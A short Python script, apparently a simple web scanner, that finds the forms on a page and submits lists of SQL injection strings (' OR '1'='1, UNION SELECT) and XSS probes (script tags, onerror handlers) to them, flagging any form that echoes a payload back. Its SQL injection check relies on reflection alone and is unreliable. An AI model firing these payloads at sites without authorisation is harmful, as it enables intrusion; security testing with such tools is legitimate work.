import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin

def find_forms(html_content):
    """Extract all forms from the HTML content."""
    soup = BeautifulSoup(html_content, "html.parser")
    return soup.find_all("form")

def is_vulnerable_to_sql_injection(url, form):
    """Check if a form is vulnerable to SQL Injection."""
    sql_payloads = [
        "' OR '1'='1",
        "' OR '1'='1' --",
        "' OR '1'='1' #",
        "' OR '1'='1'/*",
        "' UNION SELECT NULL, NULL, NULL --",
        "' UNION SELECT NULL, NULL, NULL #",
        "admin' --",
        "admin' #"
    ]
    
    form_action = form.get("action", "")
    form_method = form.get("method", "get").lower()
    inputs = form.find_all("input")
    
    data = {}
    for input_tag in inputs:
        input_name = input_tag.get("name")
        if input_name:
            data[input_name] = None  # Initialize with None or an empty value
    
    form_url = urljoin(url, form_action) if form_action else url
    
    for payload in sql_payloads:
        data.update({name: payload for name in data.keys()})
        
        try:
            if form_method == "post":
                response = requests.post(form_url, data=data)
            else:
                response = requests.get(form_url, params=data)

            if payload in response.text:
                return True
        except requests.exceptions.RequestException as e:
            print(f"Error during SQL Injection test: {e}")
    
    return False

def is_vulnerable_to_xss(url, form):
    """Check if a form is vulnerable to XSS."""
    xss_payloads = [
        "<script>alert('XSS')</script>",
        "<img src='x' onerror='alert(1)'>",
        "<svg/onload=alert(1)>",
        "<body onload=alert(1)>",
        "<iframe src='javascript:alert(1)'></iframe>"
    ]
    
    form_action = form.get("action", "")
    form_method = form.get("method", "get").lower()
    inputs = form.find_all("input")
    
    data = {}
    for input_tag in inputs:
        input_name = input_tag.get("name")
        if input_name:
            data[input_name] = None  # Initialize with None or an empty value
    
    form_url = urljoin(url, form_action) if form_action else url
    
    for payload in xss_payloads:
        data.update({name: payload for name in data.keys()})
        
        try:
            if form_method == "post":
                response = requests.post(form_url, data=data)
            else:
                response = requests.get(form_url, params=data)

            if payload in response.text:
                return True
        except requests.exceptions.RequestException as e:
            print(f"Error during XSS test: {e}")
    
    return False
